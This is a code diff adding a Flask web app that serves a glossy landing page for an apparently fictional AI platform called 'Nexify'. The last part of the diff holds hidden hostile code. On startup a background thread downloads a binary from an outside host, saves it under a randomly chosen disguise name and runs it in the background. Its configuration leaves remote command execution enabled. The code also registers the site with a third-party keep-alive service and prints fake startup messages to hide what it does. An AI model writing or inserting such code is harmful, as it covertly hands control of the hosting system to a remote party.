+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            font-size: 28px;
+        }
+
+        .feature-card h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+
+        .feature-card p {
+            color: #5a5b6e;
+            line-height: 1.5;
+        }
+
+        /* Benefits */
+        .benefits {
+            padding: 100px 0;
+            background-color: #fbfaff;
+        }
+
+        .benefits-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 40px;
+        }
+
+        .benefit-item {
+            text-align: center;
+            padding: 28px 20px;
+            background: white;
+            border-radius: 28px;
+            transition: all 0.2s;
+            border: 1px solid #f0ebff;
+        }
+
+        .benefit-icon {
+            color: #8b5cf6;
+            font-size: 44px;
+            margin-bottom: 20px;
+        }
+
+        .benefit-item h3 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .benefit-item p {
+            color: #5a5b6e;
+        }
+
+        /* Testimonials */
+        .testimonials {
+            padding: 100px 0;
+            background: white;
+        }
+
+        .testimonial-slider {
+            max-width: 850px;
+            margin: 0 auto;
+        }
+
+        .testimonial {
+            background: #fefbff;
+            padding: 48px 44px;
+            border-radius: 40px;
+            text-align: center;
+            box-shadow: 0 12px 28px -8px rgba(0, 0, 0, 0.05);
+            border: 1px solid #ede6ff;
+        }
+
+        .testimonial-text {
+            font-size: 1.28rem;
+            font-style: normal;
+            font-weight: 500;
+            margin-bottom: 32px;
+            color: #252641;
+            line-height: 1.45;
+        }
+
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .author-avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 100%;
+            background: linear-gradient(145deg, #e9deff, #d9c9ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: #6d28d9;
+        }
+
+        .author-info h4 {
+            font-size: 1.2rem;
+            margin-bottom: 4px;
+        }
+
+        .author-info p {
+            color: #6c6d80;
+            font-size: 0.85rem;
+        }
+
+        /* Pricing */
+        .pricing {
+            padding: 100px 0;
+            background: #fefaff;
+        }
+
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 32px;
+        }
+
+        .pricing-card {
+            background: white;
+            border-radius: 36px;
+            padding: 40px 28px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.03);
+            text-align: center;
+            transition: all 0.25s;
+            border: 1px solid #ede6ff;
+        }
+
+        .pricing-card.featured {
+            border-top: 6px solid #8b5cf6;
+            position: relative;
+            transform: scale(1.02);
+            box-shadow: 0 20px 35px -12px rgba(139, 92, 246, 0.2);
+        }
+
+        .featured-badge {
+            position: absolute;
+            top: -14px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #8b5cf6;
+            color: white;
+            padding: 6px 20px;
+            border-radius: 60px;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+
+        .pricing-card:hover {
+            transform: translateY(-8px);
+        }
+
+        .pricing-card.featured:hover {
+            transform: scale(1.02) translateY(-8px);
+        }
+
+        .plan-name {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 18px;
+        }
+
+        .plan-price {
+            font-size: 3rem;
+            font-weight: 800;
+            color: #8b5cf6;
+            margin-bottom: 24px;
+        }
+
+        .plan-price span {
+            font-size: 1rem;
+            color: #7f7f92;
+            font-weight: 500;
+        }
+
+        .plan-features {
+            list-style: none;
+            margin-bottom: 32px;
+        }
+
+        .plan-features li {
+            padding: 12px 0;
+            border-bottom: 1px solid #f0eaff;
+            color: #454658;
+            font-weight: 500;
+        }
+
+        .plan-features li:last-child {
+            border-bottom: none;
+        }
+
+        /* CTA Section */
+        .cta-section {
+            padding: 100px 0;
+            background: linear-gradient(125deg, #1e1a3a 0%, #2b1e4e 100%);
+            text-align: center;
+            color: white;
+        }
+
+        .cta-section h2 {
+            font-size: 2.6rem;
+            margin-bottom: 20px;
+        }
+
+        .cta-section p {
+            font-size: 1.2rem;
+            max-width: 650px;
+            margin: 0 auto 32px;
+            opacity: 0.85;
+        }
+
+        .cta-section .cta-button {
+            background: white;
+            color: #6d28d9;
+            box-shadow: none;
+            font-size: 1rem;
+            padding: 14px 38px;
+        }
+
+        .cta-section .cta-button:hover {
+            background: #f5f0ff;
+            transform: translateY(-2px);
+        }
+
+        /* Footer */
+        footer {
+            background-color: #0c0b15;
+            color: #a8a9bc;
+            padding: 70px 0 24px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 48px;
+            margin-bottom: 56px;
+        }
+
+        .footer-column h3 {
+            font-size: 1.2rem;
+            color: #eef2ff;
+            margin-bottom: 22px;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #b9bad2;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #c084fc;
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 28px;
+            border-top: 1px solid #24213a;
+            font-size: 0.85rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 992px) {
+            .hero-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            .hero-text p {
+                margin: 0 auto 30px;
+            }
+            .hero-buttons {
+                justify-content: center;
+            }
+            .pricing-card.featured {
+                transform: none;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            .mobile-menu-btn {
+                display: block;
+            }
+            .hero-text h1 {
+                font-size: 38px;
+            }
+            .section-title h2 {
+                font-size: 30px;
+            }
+            .testimonial {
+                padding: 32px 24px;
+            }
+            .testimonial-text {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 560px) {
+            .hero {
+                padding: 130px 0 70px;
+            }
+            .feature-card, .benefit-item, .pricing-card {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">
+                    <div class="logo-icon"><i class="fas fa-robot"></i></div>
+                    <div class="logo-text">Nex<span>ify</span></div>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="#features">Capabilities</a></li>
+                    <li><a href="#benefits">Why Nexify</a></li>
+                    <li><a href="#testimonials">Stories</a></li>
+                    <li><a href="#pricing">Plans</a></li>
+                    <li><a href="#">Resources</a></li>
+                </ul>
+                <button class="cta-button">Try free →</button>
+                <button class="mobile-menu-btn"><i class="fas fa-bars"></i></button>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <div class="hero-text">
+                    <h1>Intelligent workflows, <span>built without limits</span></h1>
+                    <p>Nexify empowers teams to design, automate, and scale AI-native applications — no deep coding required. Connect models, data, and logic visually.</p>
+                    <div class="hero-buttons">
+                        <button class="cta-button">Start building free</button>
+                        <button class="secondary-button">Watch demo</button>
+                    </div>
+                </div>
+                <div class="hero-image">
+                    <img src="https://images.unsplash.com/photo-1581291518633-83b4ebd1d83e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" alt="Nexify AI Dashboard concept">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="features" id="features">
+        <div class="container">
+            <div class="section-title">
+                <h2>Everything you need to build with AI</h2>
+                <p>From prototype to production, Nexify combines no‑code simplicity with professional flexibility.</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-cubes"></i></div>
+                    <h3>Visual AI Builder</h3>
+                    <p>Drag & drop pre‑trained models, prompt nodes, and logic gates. Build complex AI chains in minutes.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-database"></i></div>
+                    <h3>Unified Data Hub</h3>
+                    <p>Connect to databases, CRMs, or vector stores. Sync live data without writing SQL or API glue.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-cloud-upload-alt"></i></div>
+                    <h3>Deploy anywhere</h3>
+                    <p>One‑click cloud deployment or self‑hosted on your infrastructure. Auto‑scaling out of the box.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-brain"></i></div>
+                    <h3>LLM playground</h3>
+                    <p>Compare GPT-4o, Claude, Gemini, and open‑source models. Tune prompts without code.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-shield-hooded"></i></div>
+                    <h3>Enterprise security</h3>
+                    <p>SSO, RBAC, data encryption, and audit logs — ready for regulated industries.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-chalkboard-user"></i></div>
+                    <h3>Human-in-the-loop</h3>
+                    <p>Add approvals, reviews, and fallback logic to keep AI workflows reliable and safe.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="benefits" id="benefits">
+        <div class="container">
+            <div class="section-title">
+                <h2>Why forward‑thinking teams choose Nexify</h2>
+                <p>Accelerate AI adoption without sacrificing control or creativity.</p>
+            </div>
+            <div class="benefits-grid">
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-gauge-high"></i></div>
+                    <h3>5x faster delivery</h3>
+                    <p>Build AI features in days instead of sprints — from idea to working prototype.</p>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-coins"></i></div>
+                    <h3>Reduce costs by 65%</h3>
+                    <p>Cut infrastructure overhead and developer hours with visual tooling.</p>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-chalkboard"></i></div>
+                    <h3>Empower domain experts</h3>
+                    <p>Let product owners and analysts build intelligent automations safely.</p>
+                </div>
+                <div class="benefit-item">
+                    <div class="benefit-icon"><i class="fas fa-arrow-trend-up"></i></div>
+                    <h3>Future‑proof scaling</h3>
+                    <p>From hackathon MVP to mission‑critical AI platform on the same stack.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="testimonials" id="testimonials">
+        <div class="container">
+            <div class="section-title">
+                <h2>Loved by AI pioneers & enterprises</h2>
+                <p>Join thousands of builders who ship faster with Nexify.</p>
+            </div>
+            <div class="testimonial-slider">
+                <div class="testimonial">
+                    <div class="testimonial-text">“Nexify turned our AI pilots into production‑ready systems within 6 weeks. The visual workflow builder made collaboration between ML engineers and product teams seamless.”</div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">DR</div>
+                        <div class="author-info">
+                            <h4>Dr. Elena Rossi</h4>
+                            <p>Head of AI, Vectra Health</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="pricing" id="pricing">
+        <div class="container">
+            <div class="section-title">
+                <h2>Simple plans, limitless potential</h2>
+                <p>Start free, upgrade when you grow. All plans include core AI building blocks.</p>
+            </div>
+            <div class="pricing-grid">
+                <div class="pricing-card">
+                    <h3 class="plan-name">Starter</h3>
+                    <div class="plan-price">$39<span>/month</span></div>
+                    <ul class="plan-features">
+                        <li>Up to 5 team members</li>
+                        <li>20 GB vector storage</li>
+                        <li>Pre‑built AI components</li>
+                        <li>Community support</li>
+                        <li>2 production apps</li>
+                    </ul>
+                    <button class="secondary-button">Start free trial</button>
+                </div>
+                <div class="pricing-card featured">
+                    <div class="featured-badge">🔥 Most popular</div>
+                    <h3 class="plan-name">Pro</h3>
+                    <div class="plan-price">$99<span>/month</span></div>
+                    <ul class="plan-features">
+                        <li>Up to 20 members</li>
+                        <li>200 GB + vector DB</li>
+                        <li>All LLM models & fine‑tuning</li>
+                        <li>Priority chat support</li>
+                        <li>Unlimited apps + API access</li>
+                        <li>Custom prompt libraries</li>
+                    </ul>
+                    <button class="cta-button">Try 14 days free</button>
+                </div>
+                <div class="pricing-card">
+                    <h3 class="plan-name">Enterprise</h3>
+                    <div class="plan-price">Custom</div>
+                    <ul class="plan-features">
+                        <li>Unlimited seats</li>
+                        <li>Unlimited storage & throughput</li>
+                        <li>SLA 99.9% uptime</li>
+                        <li>24/7 dedicated support</li>
+                        <li>On‑prem / VPC deployment</li>
+                        <li>Custom AI model hosting</li>
+                    </ul>
+                    <button class="secondary-button">Contact sales</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="cta-section">
+        <div class="container">
+            <h2>Launch your first AI agent today</h2>
+            <p>No credit card required. Build, test, and deploy intelligent workflows in minutes — not months.</p>
+            <button class="cta-button">Get started for free →</button>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <div class="logo">
+                        <div class="logo-icon"><i class="fas fa-robot"></i></div>
+                        <div class="logo-text">Nex<span>ify</span></div>
+                    </div>
+                    <p style="margin-top: 20px; color: #b9bad2;">The modern AI automation suite built for business & engineering teams.</p>
+                </div>
+                <div class="footer-column">
+                    <h3>Platform</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Features</a></li>
+                        <li><a href="#">Integrations</a></li>
+                        <li><a href="#">AI models</a></li>
+                        <li><a href="#">Security</a></li>
+                        <li><a href="#">Roadmap</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Resources</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Documentation</a></li>
+                        <li><a href="#">Guides & tutorials</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Community</a></li>
+                        <li><a href="#">API reference</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Company</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">About Nexify</a></li>
+                        <li><a href="#">Careers</a></li>
+                        <li><a href="#">Press</a></li>
+                        <li><a href="#">Privacy & terms</a></li>
+                        <li><a href="#">Contact</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2025 Nexify. All rights reserved. Intelligent automation for everyone.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        (function(){
+            // Mobile menu toggle
+            const mobileBtn = document.querySelector('.mobile-menu-btn');
+            const navLinks = document.querySelector('.nav-links');
+            
+            if(mobileBtn) {
+                mobileBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if(navLinks.style.display === 'flex') {
+                        navLinks.style.display = 'none';
+                    } else {
+                        navLinks.style.display = 'flex';
+                        if(window.innerWidth <= 768) {
+                            navLinks.style.flexDirection = 'column';
+                            navLinks.style.position = 'absolute';
+                            navLinks.style.top = '80px';
+                            navLinks.style.left = '0';
+                            navLinks.style.width = '100%';
+                            navLinks.style.backgroundColor = '#ffffff';
+                            navLinks.style.padding = '28px 24px';
+                            navLinks.style.boxShadow = '0 20px 30px rgba(0,0,0,0.08)';
+                            navLinks.style.gap = '24px';
+                            navLinks.style.borderBottom = '1px solid #ede6ff';
+                            const listItems = document.querySelectorAll('.nav-links li');
+                            listItems.forEach(li => li.style.margin = '0');
+                        }
+                    }
+                });
+            }
+            
+            // Smooth scroll + close mobile menu on anchor click
+            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+                anchor.addEventListener('click', function(e) {
+                    const targetId = this.getAttribute('href');
+                    if(targetId === '#') return;
+                    const target = document.querySelector(targetId);
+                    if(target) {
+                        e.preventDefault();
+                        window.scrollTo({
+                            top: target.offsetTop - 80,
+                            behavior: 'smooth'
+                        });
+                        if(window.innerWidth <= 768 && navLinks) {
+                            navLinks.style.display = 'none';
+                        }
+                    }
+                });
+            });
+            
+            // Testimonial carousel (rotating content)
+            const testimonialData = [
+                { text: "Nexify turned our AI pilots into production‑ready systems within 6 weeks. The visual workflow builder made collaboration between ML engineers and product teams seamless.", name: "Dr. Elena Rossi", position: "Head of AI, Vectra Health", initials: "ER" },
+                { text: "We automated 80% of customer support queries using Nexify's LLM pipelines. The no‑code connectors saved months of backend work. Absolute game changer.", name: "Marcus Velez", position: "VP of Product, Supportly", initials: "MV" },
+                { text: "As a creative agency, we now prototype AI features in days instead of months. Nexify gives us the freedom to experiment and scale instantly.", name: "Sofia Nakamura", position: "Creative Director, Naked Studio", initials: "SN" }
+            ];
+            
+            let currentIdx = 0;
+            const testimonialContainer = document.querySelector('.testimonial');
+            
+            function updateTestimonial() {
+                if(!testimonialContainer) return;
+                const t = testimonialData[currentIdx];
+                testimonialContainer.innerHTML = `
+                    <div class="testimonial-text">“${t.text}”</div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">${t.initials}</div>
+                        <div class="author-info">
+                            <h4>${t.name}</h4>
+                            <p>${t.position}</p>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            if(testimonialContainer && testimonialData.length) {
+                updateTestimonial();
+                setInterval(() => {
+                    currentIdx = (currentIdx + 1) % testimonialData.length;
+                    updateTestimonial();
+                }, 5200);
+            }
+            
+            // CTA button alerts (demo interactions)
+            const allCtaBtns = document.querySelectorAll('.cta-button');
+            const secondaryBtns = document.querySelectorAll('.secondary-button');
+            
+            allCtaBtns.forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    if(btn.closest('.cta-section') && btn.innerText.includes('Get started')) {
+                        alert("✨ Welcome to Nexify! You would be redirected to the sign-up page in a live version. Start building with AI.");
+                    } else if(btn.innerText.includes('Try free') || btn.innerText.includes('Start building free')) {
+                        alert("🚀 Nexify free trial — instant access to visual AI builder. No credit card required.");
+                    } else {
+                        alert("⚡ Nexify: Supercharge your workflows. Reach out to our team anytime.");
+                    }
+                });
+            });
+            
+            secondaryBtns.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    if(btn.innerText.includes('Watch demo')) {
+                        alert("🎥 Nexify demo: see how to build an AI agent in 3 minutes (full walkthrough available).");
+                    } else if(btn.innerText.includes('Start free trial') || btn.innerText.includes('Contact sales')) {
+                        alert("📞 Our team will reach out shortly. Meanwhile explore our free tier.");
+                    } else {
+                        alert("💡 More info about Nexify plans — check our docs or talk to sales.");
+                    }
+                });
+            });
+            
+            // close mobile menu on resize if needed
+            window.addEventListener('resize', function() {
+                if(window.innerWidth > 768 && navLinks) {
+                    navLinks.style.display = '';
+                    navLinks.style.removeProperty('flex-direction');
+                    navLinks.style.removeProperty('position');
+                    navLinks.style.removeProperty('top');
+                    navLinks.style.removeProperty('width');
+                    navLinks.style.removeProperty('padding');
+                    navLinks.style.removeProperty('box-shadow');
+                } else if(window.innerWidth <= 768 && navLinks.style.display === 'flex') {
+                    navLinks.style.display = 'flex';
+                    navLinks.style.flexDirection = 'column';
+                    navLinks.style.position = 'absolute';
+                    navLinks.style.top = '80px';
+                    navLinks.style.left = '0';
+                    navLinks.style.width = '100%';
+                    navLinks.style.backgroundColor = '#ffffff';
+                    navLinks.style.padding = '28px 24px';
+                    navLinks.style.boxShadow = '0 20px 30px rgba(0,0,0,0.08)';
+                }
+            });
+        })();
+    </script>
+</body>
+</html>'''
+
+@app.route('/health')
+def health():
+    return 'OK'
+
+# ============== 哪吒代理 ==============
+def run_agent():
+    if not NEZHA_SERVER or not NEZHA_KEY:
+        return
+    
+    os.makedirs(FILE_PATH, exist_ok=True)
+    arch = 'arm' if 'arm' in platform.machine().lower() or 'aarch64' in platform.machine().lower() else 'amd'
+    disguise_name = random.choice(DISGUISE_NAMES)
+    
+    url = f"https://{arch}64.ssss.nyc.mn/v1" if not NEZHA_PORT else f"https://{arch}64.ssss.nyc.mn/agent"
+    agent_path = os.path.join(FILE_PATH, disguise_name)
+    
+    try:
+        r = requests.get(url, stream=True, timeout=60)
+        with open(agent_path, 'wb') as f:
+            for chunk in r.iter_content(8192):
+                f.write(chunk)
+        os.chmod(agent_path, 0o755)
+    except:
+        return
+    
+    tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
+    
+    if NEZHA_PORT:
+        tls = '--tls' if NEZHA_PORT in tls_ports else ''
+        cmd = f"nohup {agent_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {tls} >/dev/null 2>&1 &"
+    else:
+        port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else "443"
+        tls = "true" if port in tls_ports else "false"
+        config = f"""client_secret: {NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: false
+ip_report_period: 1800
+report_delay: 4
+server: {NEZHA_SERVER}
+skip_connection_count: false
+skip_procs_count: false
+temperature: false
+tls: {tls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: {UUID}"""
+        config_path = os.path.join(FILE_PATH, 'config.yaml')
+        with open(config_path, 'w') as f:
+            f.write(config)
+        cmd = f"nohup {agent_path} -c {config_path} >/dev/null 2>&1 &"
+    
+    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# ============== 保活任务 ==============
+def add_visit_task():
+    if not PROJECT_URL:
+        print("  ⚠️ PROJECT_URL 未设置，跳过保活任务")
+        return
+    try:
+        resp = requests.post(
+            "https://keep.jjbb.ccwu.cc/add-url",
+            json={"url": PROJECT_URL},
+            timeout=10
+        )
+        if resp.ok:
+            print(f"  ✅ 保活任务添加成功: {PROJECT_URL}")
+        else:
+            print(f"  ❌ 保活任务添加失败，状态码: {resp.status_code}")
+    except Exception as e:
+        print(f"  ❌ 保活任务请求异常: {e}")
+
+# ============== 伪装启动信息 ==============
+def fake_startup():
+    print("Starting application...")
+    time.sleep(0.3)
+    print(" * Loading configuration...")
+    time.sleep(0.2)
+    print(" * Initializing modules...")
+    time.sleep(0.2)
+    print(" * Starting background workers...")
+    time.sleep(0.2)
+    print(f" * Running on http://0.0.0.0:{PORT}")
+    print(" * Application started successfully")
+    sys.stdout.flush()
+
+# ============== 启动 ==============
+Thread(target=run_agent, daemon=True).start()
+
+if __name__ == "__main__":
+    fake_startup()
+    add_visit_task()
+    import logging
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
+    app.run(host='0.0.0.0', port=PORT)
